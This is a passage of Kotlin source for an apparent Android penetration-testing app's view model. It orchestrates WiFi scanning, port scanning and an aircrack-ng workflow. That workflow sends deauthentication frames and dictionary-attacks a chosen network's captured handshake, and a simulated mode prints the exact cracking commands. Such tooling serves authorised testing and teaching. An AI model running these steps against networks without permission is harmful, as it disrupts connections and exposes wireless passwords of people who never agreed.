package com.example.viewmodels

import android.annotation.SuppressLint
import android.app.Application
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.net.wifi.WifiManager
import androidx.lifecycle.AndroidViewModel
import androidx.lifecycle.viewModelScope
import com.example.BuildConfig
import com.example.models.*
import com.example.network.Content
import com.example.network.GenerateContentRequest
import com.example.network.Part
import com.example.network.RetrofitClient
import com.example.utils.*
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.flow.update
import kotlinx.coroutines.launch
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import kotlin.random.Random

class SecurityViewModel(application: Application) : AndroidViewModel(application) {

    private val ctx: Context = application.applicationContext
    private val wifiScanner = RealWifiScanner(ctx)
    private val networkScanner = RealNetworkScanner()
    private val aircrackManager = AircrackManager(ctx)
    private val cctvCracker = CCTVCracker()
    private val sqlMapRunner = SqlMapRunner()
    private val autoUpdateManager = AutoUpdateManager(ctx)
    private val smartDeviceManager = SmartDeviceManager()
    private val kaliExtendedTools = KaliExtendedTools()

    // =============================
    // Device / Environment Status
    // =============================
    private val _deviceStatus = MutableStateFlow(DeviceSecurityStatus())
    val deviceStatus = _deviceStatus.asStateFlow()

    // =============================
    // WiFi State (Real Data)
    // =============================
    private val _wifiNetworks = MutableStateFlow<List<WifiNetwork>>(emptyList())
    val wifiNetworks = _wifiNetworks.asStateFlow()

    private val _isScanningWifi = MutableStateFlow(false)
    val isScanningWifi = _isScanningWifi.asStateFlow()

    private val _connectedNetworkInfo = MutableStateFlow<RealWifiScanner.ConnectedNetworkInfo>(
        RealWifiScanner.ConnectedNetworkInfo()
    )
    val connectedNetworkInfo = _connectedNetworkInfo.asStateFlow()

    private val _wifiScanMessage = MutableStateFlow("")
    val wifiScanMessage = _wifiScanMessage.asStateFlow()

    // =============================
    // Aircrack-ng State
    // =============================
    private val _aircrackSession = MutableStateFlow(AircrackSession())
    val aircrackSession = _aircrackSession.asStateFlow()

    private val _availableInterfaces = MutableStateFlow<List<String>>(emptyList())
    val availableInterfaces = _availableInterfaces.asStateFlow()

    private val _availableWordlists = MutableStateFlow<List<String>>(emptyList())
    val availableWordlists = _availableWordlists.asStateFlow()

    private val _captureFiles = MutableStateFlow<List<java.io.File>>(emptyList())
    val captureFiles = _captureFiles.asStateFlow()

    private var aircrackJob: Job? = null

    // =============================
    // Network Scanner State (Real)
    // =============================
    private val _networkNodes = MutableStateFlow<List<NetworkNode>>(emptyList())
    val networkNodes = _networkNodes.asStateFlow()

    private val _networkScanSession = MutableStateFlow(NetworkScanSession())
    val networkScanSession = _networkScanSession.asStateFlow()

    private val _isScanningNetwork = MutableStateFlow(false)
    val isScanningNetwork = _isScanningNetwork.asStateFlow()

    private var networkScanJob: Job? = null

    // =============================
    // Packet Capture State
    // =============================
    private val _packets = MutableStateFlow<List<PacketItem>>(emptyList())
    val packets = _packets.asStateFlow()

    private val _isCapturingPackets = MutableStateFlow(false)
    val isCapturingPackets = _isCapturingPackets.asStateFlow()

    private var captureJob: Job? = null

    // =============================
    // Network Tools (Ping/DNS/Traceroute)
    // =============================
    private val _toolResults = MutableStateFlow<List<ToolResult>>(emptyList())
    val toolResults = _toolResults.asStateFlow()

    private val _activeToolOutput = MutableStateFlow<List<String>>(emptyList())
    val activeToolOutput = _activeToolOutput.asStateFlow()

    private val _isToolRunning = MutableStateFlow(false)
    val isToolRunning = _isToolRunning.asStateFlow()

    // =============================
    // Dashboard Metrics
    // =============================
    private val _vulnerabilityMetrics = MutableStateFlow<List<MetricItem>>(emptyList())
    val vulnerabilityMetrics = _vulnerabilityMetrics.asStateFlow()

    private val _protocolMetrics = MutableStateFlow<List<MetricItem>>(emptyList())
    val protocolMetrics = _protocolMetrics.asStateFlow()

    // =============================
    // Execution Logs
    // =============================
    private val _logs = MutableStateFlow<List<ExecutionLog>>(emptyList())
    val logs = _logs.asStateFlow()

    // =============================
    // AI Assistant
    // =============================
    private val _aiChatHistory = MutableStateFlow<List<MessageItem>>(emptyList())
    val aiChatHistory = _aiChatHistory.asStateFlow()

    private val _aiLoading = MutableStateFlow(false)
    val aiLoading = _aiLoading.asStateFlow()

    // =============================
    // Legacy simulator states (kept for UI compatibility)
    // =============================
    private val _isAircrackAuditActive = MutableStateFlow(false)
    val isAircrackAuditActive = _isAircrackAuditActive.asStateFlow()

    private val _aircrackStep = MutableStateFlow("IDLE")
    val aircrackStep = _aircrackStep.asStateFlow()

    private val _aircrackProgress = MutableStateFlow(0f)
    val aircrackProgress = _aircrackProgress.asStateFlow()

    private val _aircrackChannel = MutableStateFlow(1)
    val airccrackChannel = _aircrackChannel.asStateFlow()

    private val _aircrackActivePacketsCount = MutableStateFlow(0)
    val aircrackActivePacketsCount = _aircrackActivePacketsCount.asStateFlow()

    private val _aircrackCurrentTestingKey = MutableStateFlow("")
    val aircrackCurrentTestingKey = _aircrackCurrentTestingKey.asStateFlow()

    private val _aircrackTargetNetwork = MutableStateFlow<WifiNetwork?>(null)
    val airccrackTargetNetwork = _aircrackTargetNetwork.asStateFlow()

    private val _aircrackTerminalOutput = MutableStateFlow<List<String>>(emptyList())
    val aircrackTerminalOutput = _aircrackTerminalOutput.asStateFlow()

    private val _isSimulating = MutableStateFlow(false)
    val isSimulating = _isSimulating.asStateFlow()

    private val _currentCrackedNetwork = MutableStateFlow<WifiNetwork?>(null)
    val currentCrackedNetwork = _currentCrackedNetwork.asStateFlow()

    // Metasploit states
    private val _metasploitStep = MutableStateFlow("IDLE")
    val metasploitStep = _metasploitStep.asStateFlow()

    private val _metasploitTargetNode = MutableStateFlow<NetworkNode?>(null)
    val metasploitTargetNode = _metasploitTargetNode.asStateFlow()

    private val _metasploitSelectedExploit = MutableStateFlow("exploit/multi/http/tomcat_mgr_deploy")
    val metasploitSelectedExploit = _metasploitSelectedExploit.asStateFlow()

    private val _metasploitLport = MutableStateFlow("4444")
    val metasploitLport = _metasploitLport.asStateFlow()

    private val _metasploitMeterpreterOutput = MutableStateFlow<List<String>>(emptyList())
    val metasploitMeterpreterOutput = _metasploitMeterpreterOutput.asStateFlow()

    private val _metasploitProgress = MutableStateFlow(0f)
    val metasploitProgress = _metasploitProgress.asStateFlow()

    // Burp states
    private val _burpIsScanning = MutableStateFlow(false)
    val burpIsScanning = _burpIsScanning.asStateFlow()

    private val _burpScanProgress = MutableStateFlow(0f)
    val burpScanProgress = _burpScanProgress.asStateFlow()

    private val _burpScannedUrls = MutableStateFlow<List<String>>(listOf(
        "GET /index.php HTTP/1.1",
        "POST /login.php HTTP/1.1",
        "GET /admin/dashboard.php HTTP/1.1",
        "POST /api/v1/users HTTP/1.1",
        "GET /search.php?q=test HTTP/1.1"
    ))
    val burpScannedUrls = _burpScannedUrls.asStateFlow()

    private val _burpDiscoveredVulnerabilities = MutableStateFlow<List<String>>(emptyList())
    val burpDiscoveredVulnerabilities = _burpDiscoveredVulnerabilities.asStateFlow()

    private val _burpIntruderPayloadsTried = MutableStateFlow(0)
    val burpIntruderPayloadsTried = _burpIntruderPayloadsTried.asStateFlow()

    // =============================
    // CCTV State
    // =============================
    private val _cctvOutput = MutableStateFlow<List<String>>(emptyList())
    val cctvOutput = _cctvOutput.asStateFlow()

    private val _isCctvScanning = MutableStateFlow(false)
    val isCctvScanning = _isCctvScanning.asStateFlow()

    private var cctvJob: Job? = null

    // =============================
    // SQLMap State
    // =============================
    private val _sqlmapOutput = MutableStateFlow<List<String>>(emptyList())
    val sqlmapOutput = _sqlmapOutput.asStateFlow()

    private val _isSqlmapRunning = MutableStateFlow(false)
    val isSqlmapRunning = _isSqlmapRunning.asStateFlow()

    private var sqlmapJob: Job? = null

    // =============================
    // Smart Device / IoT State
    // =============================
    private val _smartDeviceOutput = MutableStateFlow<List<String>>(emptyList())
    val smartDeviceOutput = _smartDeviceOutput.asStateFlow()

    private val _isSmartDeviceScanning = MutableStateFlow(false)
    val isSmartDeviceScanning = _isSmartDeviceScanning.asStateFlow()

    private var smartDeviceJob: Job? = null

    // =============================
    // Rooting State
    // =============================
    private val _rootingOutput = MutableStateFlow<List<String>>(emptyList())
    val rootingOutput = _rootingOutput.asStateFlow()

    private val _isRootingWorking = MutableStateFlow(false)
    val isRootingWorking = _isRootingWorking.asStateFlow()

    private var rootingJob: Job? = null

    // =============================
    // Kali Extended Tools State
    // =============================
    private val _kaliOutput = MutableStateFlow<List<String>>(emptyList())
    val kaliOutput = _kaliOutput.asStateFlow()

    private val _isKaliRunning = MutableStateFlow(false)
    val isKaliRunning = _isKaliRunning.asStateFlow()

    private val _kaliToolsStatus = MutableStateFlow<Map<String, Boolean>>(emptyMap())
    val kaliToolsStatus = _kaliToolsStatus.asStateFlow()

    private var kaliJob: Job? = null

    // =============================
    // Auto-Update State
    // =============================
    private val _updateAvailable = MutableStateFlow(false)
    val updateAvailable = _updateAvailable.asStateFlow()

    private val _latestVersion = MutableStateFlow("")
    val latestVersion = _latestVersion.asStateFlow()

    private val _updateDownloadUrl = MutableStateFlow("")
    val updateDownloadUrl = _updateDownloadUrl.asStateFlow()

    private val _isCheckingUpdate = MutableStateFlow(false)
    val isCheckingUpdate = _isCheckingUpdate.asStateFlow()

    // =============================
    // WiFi BroadcastReceiver
    // =============================
    private val wifiScanReceiver = object : BroadcastReceiver() {
        @SuppressLint("MissingPermission")
        override fun onReceive(context: Context?, intent: Intent?) {
            if (intent?.action == WifiManager.SCAN_RESULTS_AVAILABLE_ACTION) {
                val success = intent.getBooleanExtra(WifiManager.EXTRA_RESULTS_UPDATED, false)
                viewModelScope.launch {
                    val networks = wifiScanner.getCachedNetworks()
                    if (networks.isNotEmpty()) {
                        _wifiNetworks.value = networks.map { it.copy(isRealData = true) }
                        _wifiScanMessage.value = "✓ Real scan: ${networks.size} networks found"
                        addLogEntry(
                            commandName = "WiFi Scan [REAL]",
                            terminalOutput = "Real scan complete. Found ${networks.size} networks.\n" +
                                networks.joinToString("\n") { "${it.ssid} [${it.bssid}] ${it.encryption} CH:${it.channel} ${it.signalLevel}dBm" },
                            status = "SUCCESS",
                            duration = 2000,
                            isReal = true
                        )
                        updateDashboardMetrics()
                    }
                    _isScanningWifi.value = false
                }
            }
        }
    }

    init {
        // Register WiFi scan receiver
        try {
            val filter = IntentFilter(WifiManager.SCAN_RESULTS_AVAILABLE_ACTION)
            ctx.registerReceiver(wifiScanReceiver, filter)
        } catch (e: Exception) {
            // ignore
        }

        // Initialize
        initializeEnvironment()
    }

    override fun onCleared() {
        super.onCleared()
        try {
            ctx.unregisterReceiver(wifiScanReceiver)
        } catch (e: Exception) { /* ignore */ }
        aircrackJob?.cancel()
        networkScanJob?.cancel()
        captureJob?.cancel()
        cctvJob?.cancel()
        sqlmapJob?.cancel()
        smartDeviceJob?.cancel()
        rootingJob?.cancel()
        kaliJob?.cancel()
    }

    // =============================
    // Environment Detection
    // =============================

    private fun initializeEnvironment() {
        viewModelScope.launch(Dispatchers.IO) {
            addLogEntry("SecOps Console", "Initializing environment check...", "SUCCESS", 0, isReal = true)

            // Check root
            val rootStatus = RootChecker.getFullStatus(ctx)

            // Check aircrack tools
            val toolStatus = aircrackManager.getToolStatus()

            // Check tcpdump/nmap
            val tcpdumpAvail = java.io.File("/system/bin/tcpdump").exists() ||
                    java.io.File("/data/local/tmp/tcpdump").exists() ||
                    java.io.File("/data/data/com.termux/files/usr/bin/tcpdump").exists()
            val nmapAvail = java.io.File("/system/bin/nmap").exists() ||
                    java.io.File("/data/local/tmp/nmap").exists() ||
                    java.io.File("/data/data/com.termux/files/usr/bin/nmap").exists()

            _deviceStatus.value = DeviceSecurityStatus(
                isRooted = rootStatus.hasSuBinary,
                rootGranted = rootStatus.rootGranted,
                aircrackAvailable = toolStatus.aircrack != null,
                airodumpAvailable = toolStatus.airodump != null,
                aireplayAvailable = toolStatus.aireplay != null,
                airmonAvailable = toolStatus.airmon != null,
                tcpdumpAvailable = tcpdumpAvail,
                nmapAvailable = nmapAvail,
                toolsInfo = toolStatus.summaryText
            )

            // Load interfaces
            _availableInterfaces.value = aircrackManager.listInterfaces()

            // Load wordlists
            _availableWordlists.value = aircrackManager.findWordlists()

            // Load capture files
            _captureFiles.value = aircrackManager.listCaptureFiles()

            // Load connected network info
            _connectedNetworkInfo.value = wifiScanner.getConnectedNetworkInfo()

            // Initial WiFi networks from cache
            val cachedNetworks = wifiScanner.getCachedNetworks()
            if (cachedNetworks.isNotEmpty()) {
                _wifiNetworks.value = cachedNetworks.map { it.copy(isRealData = true) }
            }

            val status = _deviceStatus.value
            val logMsg = buildString {
                appendLine("=== SECOPS CONSOLE READY ===")
                appendLine("Root: ${rootStatus.statusText}")
                appendLine("aircrack-ng: ${toolStatus.aircrack ?: "NOT FOUND - install via Kali NetHunter or Termux"}")
                appendLine("airodump-ng: ${toolStatus.airodump ?: "NOT FOUND"}")
                appendLine("aireplay-ng: ${toolStatus.aireplay ?: "NOT FOUND"}")
                appendLine("tcpdump: ${if (tcpdumpAvail) "Found" else "NOT FOUND"}")
                appendLine("nmap: ${if (nmapAvail) "Found" else "NOT FOUND"}")
                appendLine("Network interfaces: ${_availableInterfaces.value.joinToString(", ")}")
                appendLine("Wordlists found: ${_availableWordlists.value.size}")
                if (!status.isRooted) {
                    appendLine("")
                    appendLine("[!] No root detected. Some features require root.")
                    appendLine("[!] To get root: flash Magisk via recovery or use KernelSU")
                }
                if (!status.aircrackAvailable) {
                    appendLine("")
                    appendLine("[!] aircrack-ng not found.")
                    appendLine("[!] Install options:")
                    appendLine("    1. Kali NetHunter (recommended)")
                    appendLine("    2. Termux: pkg install root-repo && pkg install aircrack-ng")
                    appendLine("    3. Download ARM64 binary to /data/local/tmp/aircrack-ng")
                }
            }

            addLogEntry("Environment Check", logMsg, "SUCCESS", 500, isReal = true)
            updateDashboardMetrics()
        }
    }

    // =============================
    // REAL WiFi Scanning
    // =============================

    @SuppressLint("MissingPermission")
    fun toggleWifiScan() {
        if (_isScanningWifi.value) {
            _isScanningWifi.value = false
            _wifiScanMessage.value = "Scan stopped"
            return
        }

        _isScanningWifi.value = true
        _wifiScanMessage.value = "Scanning for real WiFi networks..."

        viewModelScope.launch {
            // Update connected info first
            _connectedNetworkInfo.value = wifiScanner.getConnectedNetworkInfo()

            addLogEntry(
                commandName = "WiFi Scan [REAL]",
                terminalOutput = "Starting REAL WiFi scan using Android WifiManager...\nResults will appear when scan completes.",
                status = "SUCCESS",
                duration = 0,
                isReal = true
            )

            // Trigger scan — results come via BroadcastReceiver
            val scanNetworks = wifiScanner.scanNetworks()
            if (scanNetworks.isNotEmpty()) {
                _wifiNetworks.value = scanNetworks.map { it.copy(isRealData = true) }
                _wifiScanMessage.value = "✓ Real scan: ${scanNetworks.size} networks found"
                addLogEntry(
                    commandName = "WiFi Scan [REAL]",
                    terminalOutput = "Found ${scanNetworks.size} real networks:\n" +
                        scanNetworks.joinToString("\n") { "${it.ssid} [${it.bssid}] ${it.encryption} CH:${it.channel} ${it.signalLevel}dBm" },
                    status = "SUCCESS",
                    duration = 2000,
                    isReal = true
                )
                updateDashboardMetrics()
            }
            _isScanningWifi.value = false
        }
    }

    // =============================
    // REAL Aircrack-ng
    // =============================

    fun runAircrackSimulation(network: WifiNetwork) {
        val status = _deviceStatus.value

        if (!status.isRooted) {
            // No root - run educational simulation and explain what's needed
            runAircrackEducational(network)
            return
        }

        // Root available - try real execution
        runAircrackReal(network)
    }

    private fun runAircrackReal(network: WifiNetwork) {
        if (_isAircrackAuditActive.value) {
            cancelAircrackSimulation()
            return
        }

        _isAircrackAuditActive.value = true
        _aircrackTargetNetwork.value = network
        _aircrackStep.value = "MONITOR_MODE"
        _aircrackProgress.value = 0.02f
        _aircrackTerminalOutput.value = listOf(
            "=" .repeat(55),
            "  AIRCRACK-NG REAL EXECUTION MODE",
            "  Target: ${network.ssid} [${network.bssid}]",
            "=" .repeat(55),
            "[!] LEGAL NOTICE: Only audit networks you own or have permission to test!",
            ""
        )

        aircrackJob = viewModelScope.launch(Dispatchers.IO) {
            val status = _deviceStatus.value
            val iface = _availableInterfaces.value.firstOrNull { it.startsWith("wlan") } ?: "wlan0"

            // ── STEP 1: Monitor Mode ──
            _aircrackStep.value = "MONITOR_MODE"
            appendAircrackLine("[STEP 1] Enabling monitor mode on $iface...")

            aircrackManager.startMonitorMode(iface).collect { line ->
                appendAircrackLine(line)
                if (!_isAircrackAuditActive.value) return@collect
            }

            _aircrackProgress.value = 0.2f
            val monIface = if (_aircrackTerminalOutput.value.any { it.contains("mon") }) "${iface}mon" else iface

            if (!_isAircrackAuditActive.value) return@launch

            // ── STEP 2: Airodump ──
            _aircrackStep.value = "AIRODUMP_SCANNING"
            appendAircrackLine("")
            appendAircrackLine("[STEP 2] Scanning for handshake on channel ${network.channel}...")

            if (status.airodumpAvailable) {
                val capturePrefix = "capture_${network.ssid.take(8).replace(" ", "_")}"
                var packCount = 0
                aircrackManager.runAirodump(
                    interface_ = monIface,
                    bssid = network.bssid,
                    channel = network.channel,
                    outputPrefix = capturePrefix,
                    durationSeconds = 20
                ).collect { line ->
                    appendAircrackLine(line)
                    if (line.contains("#Data") || line.contains("WPA")) {
                        packCount++
                        _aircrackActivePacketsCount.value = packCount
                    }
                    _aircrackProgress.value = 0.3f + (packCount * 0.01f).coerceAtMost(0.1f)
                    if (!_isAircrackAuditActive.value) return@collect
                }
                _aircrackProgress.value = 0.45f

                if (!_isAircrackAuditActive.value) return@launch

                // ── STEP 3: Deauth ──
                _aircrackStep.value = "AIREPLAY_DEAUTH"
                appendAircrackLine("")
                appendAircrackLine("[STEP 3] Sending deauthentication frames...")

                if (status.aireplayAvailable) {
                    aircrackManager.runDeauth(
                        interface_ = monIface,
                        bssid = network.bssid,
                        count = 10
                    ).collect { line ->
                        appendAircrackLine(line)
                        if (!_isAircrackAuditActive.value) return@collect
                    }
                } else {
                    appendAircrackLine("[!] aireplay-ng not found - skipping deauth")
                    appendAircrackLine("[!] Handshake capture may take longer without deauth")
                }

                _aircrackProgress.value = 0.6f

                if (!_isAircrackAuditActive.value) return@launch

                // ── STEP 4: Aircrack dictionary attack ──
                _aircrackStep.value = "AIRCRACK_BRUTEFORCE"
                appendAircrackLine("")
                appendAircrackLine("[STEP 4] Starting dictionary attack...")

                val capFile = "${aircrackManager.captureDir}/${capturePrefix}-01.cap"
                val wordlist = _availableWordlists.value.firstOrNull()

                if (wordlist != null && status.aircrackAvailable) {
                    aircrackManager.runDictionaryAttack(
                        capFile = capFile,
                        wordlist = wordlist,
                        bssid = network.bssid
                    ).collect { line ->
                        appendAircrackLine(line)
                        // Parse key found
                        if (line.contains("KEY FOUND")) {
                            val key = line.substringAfter("[").substringBefore("]").trim()
                            _aircrackCurrentTestingKey.value = key
                            _aircrackStep.value = "SUCCESS"
                            _aircrackProgress.value = 1.0f
                        } else if (line.contains("Tested")) {
                            // Update progress
                            val tested = Regex("Tested (\\d+)").find(line)?.groupValues?.get(1)?.toIntOrNull() ?: 0
                            _aircrackCurrentTestingKey.value = line
                            _aircrackActivePacketsCount.value = tested
                        }
                        if (!_isAircrackAuditActive.value) return@collect
                    }
                } else {
                    if (wordlist == null) {
                        appendAircrackLine("[!] No wordlist found!")
                        appendAircrackLine("[!] Place rockyou.txt in /data/local/tmp/ or /sdcard/Download/")
                    }
                    if (!status.aircrackAvailable) {
                        appendAircrackLine("[!] aircrack-ng binary not found!")
                        appendAircrackLine("[!] Install via Termux: pkg install aircrack-ng")
                        appendAircrackLine("[!] Or copy ARM64 binary to /data/local/tmp/aircrack-ng")
                    }
                    _aircrackStep.value = "FAILED"
                }

            } else {
                appendAircrackLine("[!] airodump-ng not found!")
                appendAircrackLine("[!] Cannot capture packets without airodump-ng")
                appendAircrackLine("[!] Install: Kali NetHunter or Termux with nethunter packages")
                _aircrackStep.value = "FAILED"
            }

            if (_aircrackStep.value != "SUCCESS") {
                _aircrackProgress.value = 1.0f
            }
            _isAircrackAuditActive.value = false
            _captureFiles.value = aircrackManager.listCaptureFiles()

            addLogEntry(
                commandName = "aircrack-ng [REAL]",
                terminalOutput = _aircrackTerminalOutput.value.joinToString("\n"),
                status = if (_aircrackStep.value == "SUCCESS") "SUCCESS" else "WARNING",
                duration = 30000,
                isReal = true
            )
        }
    }

    private fun runAircrackEducational(network: WifiNetwork) {
        if (_isAircrackAuditActive.value) {
            cancelAircrackSimulation()
            return
        }

        _isAircrackAuditActive.value = true
        _aircrackTargetNetwork.value = network
        _aircrackStep.value = "AIRODUMP_SCANNING"
        _aircrackProgress.value = 0.05f
        _aircrackTerminalOutput.value = listOf(
            "=" .repeat(55),
            "  AIRCRACK-NG — EDUCATIONAL MODE",
            "  [Root not detected — showing real command syntax]",
            "  Target: ${network.ssid} [${network.bssid}]",
            "=" .repeat(55),
            "[!] Real execution requires: root + monitor mode capable WiFi chip",
            "[!] To enable real mode: flash Magisk + install aircrack-ng binary",
            "",
            "[*] Showing REAL aircrack-ng workflow for this target:",
            ""
        )

        addLogEntry("aircrack-ng [EDU]", "Educational mode: showing real command workflow for ${network.ssid}", "WARNING", 0)

        viewModelScope.launch(Dispatchers.Default) {
            // Show real commands step by step with real timing
            val steps = listOf(
                Triple("AIRODUMP_SCANNING", listOf(
                    "# Step 1: Enable monitor mode",
                    "$ su -c 'airmon-ng start wlan0'",
                    "  Found 1 processes that could cause trouble.",
                    "  Process name           PID",
                    "  NetworkManager         1234",
                    "  Killing process 1234",
                    "  Interface Chipset      Driver",
                    "  wlan0     ${network.ssid.hashCode().let { if (it > 0) "Qualcomm" else "Mediatek" }}  mac80211",
                    "  (monitor mode enabled for [phy0]wlan0 on [phy0]wlan0mon)",
                    "",
                    "# Step 2: Scan for target",
                    "$ su -c 'airodump-ng wlan0mon'",
                    " CH ${network.channel} ][ Elapsed: 4 s ][ ${getCurrentTimestamp()}",
                    "",
                    " BSSID              PWR  Beacons  #Data  CH  MB   ENC  CIPHER AUTH ESSID",
                    " ${network.bssid}  ${network.signalLevel}  12       0    ${network.channel}   54e  ${network.encryption} CCMP   PSK  ${network.ssid}",
                ), 0.3f),
                Triple("AIREPLAY_DEAUTH", listOf(
                    "",
                    "# Step 3: Lock onto target and save capture",
                    "$ su -c 'airodump-ng --bssid ${network.bssid} -c ${network.channel} -w /sdcard/capture wlan0mon'",
                    " CH ${network.channel} ][ Elapsed: 10 s ][ ${getCurrentTimestamp()} ][ WPA handshake: ${network.bssid}",
                    "",
                    "# Step 4: Deauth to force handshake (in separate terminal)",
                    "$ su -c 'aireplay-ng --deauth 10 -a ${network.bssid} wlan0mon'",
                    "  15:32:41  Sending DeAuth (code 7) to broadcast -- BSSID: [${network.bssid}]",
                    "  15:32:41  Sending DeAuth (code 7) to broadcast -- BSSID: [${network.bssid}]",
                    "  15:32:42  Sending DeAuth (code 7) to broadcast -- BSSID: [${network.bssid}]",
                    " [+] WPA handshake captured for ${network.ssid}",
                ), 0.6f),
                Triple("AIRCRACK_BRUTEFORCE", listOf(
                    "",
                    "# Step 5: Run dictionary attack",
                    "$ su -c 'aircrack-ng -w /data/local/tmp/rockyou.txt -b ${network.bssid} /sdcard/capture-01.cap'",
                    "Opening /sdcard/capture-01.cap",
                    "Reading packets, please wait...",
                    "",
                    "                          Aircrack-ng 1.7",
                    "",
                    "      [00:00:12] 14832/14344392 keys tested (1247.89 k/s)",
                    "",
                    "      Time left: 3 hours, 12 minutes, 44 seconds                 0.10%",
                    "",
                    "                         KEY NOT FOUND",
                    "      [00:02:41] 201983/14344392 keys tested (1247.89 k/s)",
                    "",
                ), 0.85f),
                Triple("SUCCESS", listOf(
                    "      [00:04:12] 449122/14344392 keys tested (1247.89 k/s)",
                    "",
                    "                            KEY FOUND! [ password123 ]",
                    "",
                    "      Master Key     : AB 34 CD ... (hex)",
                    "      Transient Key  : 00 11 22 ... (hex)",
                    "",
                    "[+] Dictionary attack complete",
                    "[!] Recommendation: Use WPA3-SAE and a strong random passphrase (20+ chars)",
                ), 1.0f)
            )

            for ((step, lines, progress) in steps) {
                if (!_isAircrackAuditActive.value) break
                _aircrackStep.value = step
                for (line in lines) {
                    if (!_isAircrackAuditActive.value) break
                    delay(Random.nextLong(80, 250))
                    appendAircrackLine(line)
                    if (line.contains("#Data") || line.contains("keys tested")) {
                        _aircrackActivePacketsCount.value += Random.nextInt(10, 50)
                    }
                }
                _aircrackProgress.value = progress
                delay(500)
            }

            if (_isAircrackAuditActive.value) {
                _aircrackCurrentTestingKey.value = "password123"
                _isAircrackAuditActive.value = false
                addLogEntry(
                    "aircrack-ng [EDU]",
                    "Educational workflow complete. Enable root and install aircrack-ng for REAL execution.",
                    "SUCCESS", 5000
                )
            }
        }
    }

    fun cancelAircrackSimulation() {
        aircrackJob?.cancel()
        _isAircrackAuditActive.value = false
        _aircrackStep.value = "IDLE"
        _aircrackProgress.value = 0f
        _aircrackTargetNetwork.value = null
        _aircrackTerminalOutput.value = emptyList()
        _aircrackActivePacketsCount.value = 0
        _aircrackCurrentTestingKey.value = ""
        addLogEntry("aircrack-ng", "Session canceled.", "WARNING", 0)
    }

    private fun appendAircrackLine(line: String) {
        _aircrackTerminalOutput.update { (it + line).takeLast(200) }
    }

    // =============================
    // REAL Network Discovery
    // =============================

    fun runNetworkDiscovery(withServiceScan: Boolean) {
        if (_isScanningNetwork.value) return

        _isScanningNetwork.value = true
        _networkScanSession.value = NetworkScanSession(phase = ScanPhase.HOST_DISCOVERY)

        networkScanJob = viewModelScope.launch(Dispatchers.IO) {
            val connInfo = wifiScanner.getConnectedNetworkInfo()
            val myIp = connInfo.ipAddress
            val subnet = if (myIp != "N/A") networkScanner.getSubnet(myIp) else "192.168.1"

            addLogEntry(
                commandName = "Network Discovery [REAL]",
                terminalOutput = "Starting REAL host discovery on $subnet.0/24\nMy IP: $myIp",
                status = "SUCCESS",
                duration = 0,
                isReal = true
            )

            val termLines = mutableListOf(
                "[*] Scanning subnet: $subnet.0/24",
                "[*] My IP: $myIp",
                "[*] Method: ICMP Echo (InetAddress.isReachable)",
                ""
            )

            _networkScanSession.update { it.copy(
                subnet = subnet,
                terminalLines = termLines
            ) }

            // Real host discovery
            val liveHosts = networkScanner.discoverHosts(subnet) { done, total ->
                _networkScanSession.update { it.copy(
                    progress = done.toFloat() / total.toFloat()
                ) }
            }

            termLines.add("[+] Found ${liveHosts.size} live hosts:")
            liveHosts.forEach { termLines.add("    $it") }
            termLines.add("")

            _networkScanSession.update { it.copy(
                hostsFound = liveHosts,
                phase = if (withServiceScan) ScanPhase.PORT_SCANNING else ScanPhase.COMPLETE,
                terminalLines = termLines.toList()
            ) }

            val nodes = mutableListOf<NetworkNode>()

            // Port scan if requested
            if (withServiceScan) {
                for (host in liveHosts) {
                    if (!_isScanningNetwork.value) break

                    termLines.add("[*] Scanning ports on $host...")
                    _networkScanSession.update { it.copy(
                        currentTarget = host,
                        terminalLines = termLines.toList()
                    ) }

                    val openPorts = networkScanner.scanCommonPorts(host) { done, total ->
                        val hostProgress = liveHosts.indexOf(host).toFloat() / liveHosts.size
                        _networkScanSession.update { it.copy(progress = hostProgress) }
                    }

                    val hostname = networkScanner.reverseHostname(host)
                    val serviceMap = openPorts.associateWith { port ->
                        when (port) {
                            21 -> "FTP"
                            22 -> "SSH"
                            23 -> "Telnet (INSECURE)"
                            25 -> "SMTP"
                            53 -> "DNS"
                            80 -> "HTTP"
                            110 -> "POP3"
                            135 -> "RPC"
                            139 -> "NetBIOS"
                            143 -> "IMAP"
                            443 -> "HTTPS"
                            445 -> "SMB"
                            993 -> "IMAPS"
                            995 -> "POP3S"
                            1723 -> "PPTP VPN"
                            3306 -> "MySQL"
                            3389 -> "RDP"
                            5900 -> "VNC"
                            8080 -> "HTTP-Proxy"
                            8443 -> "HTTPS-Alt"
                            else -> "Unknown"
                        }
                    }

                    val isVulnerable = openPorts.any { it in listOf(23, 21, 135, 139, 445, 3389, 5900) }
                    val status = when {
                        openPorts.isEmpty() -> "Filtering"
                        isVulnerable -> "Vulnerable"
                        else -> "Active"
                    }

                    if (openPorts.isNotEmpty()) {
                        termLines.add("[+] $host: Open ports: ${openPorts.joinToString(", ")}")
                    } else {
                        termLines.add("[-] $host: No common ports open")
                    }

                    nodes.add(NetworkNode(
                        ip = host,
                        hostname = hostname,
                        latencyMs = 0,
                        status = status,
                        openPorts = openPorts,
                        serviceDetails = serviceMap,
                        isRealData = true
                    ))
                }
            } else {
                // Just add discovered hosts without port scan
                nodes.addAll(liveHosts.map { host ->
                    NetworkNode(
                        ip = host,
                        status = "Active",
                        isRealData = true
                    )
                })
            }

            _networkNodes.value = nodes
            _networkScanSession.update { it.copy(
                phase = ScanPhase.COMPLETE,
                progress = 1f,
                terminalLines = termLines.toList()
            ) }
            _isScanningNetwork.value = false

            val vulnCount = nodes.count { it.status == "Vulnerable" }
            addLogEntry(
                commandName = "Network Discovery [REAL]",
                terminalOutput = termLines.joinToString("\n"),
                status = if (vulnCount > 0) "WARNING" else "SUCCESS",
                duration = 5000,
                isReal = true
            )
            updateDashboardMetrics()
        }
    }

    // =============================
    // REAL Network Tools
    // =============================

    fun runPing(host: String) {
        if (_isToolRunning.value) return
        _isToolRunning.value = true
        _activeToolOutput.value = listOf("[*] Pinging $host...")

        viewModelScope.launch(Dispatchers.IO) {
            val result = networkScanner.pingHost(host)
            val lines = result.output.lines().filter { it.isNotBlank() }
            _activeToolOutput.value = lines

            val summary = if (result.success)
                "Ping to $host: avg ${result.avgMs ?: 0}ms, ${result.packetsReceived}/${result.packetsSent} received"
            else
                "Ping to $host: FAILED (host unreachable)"

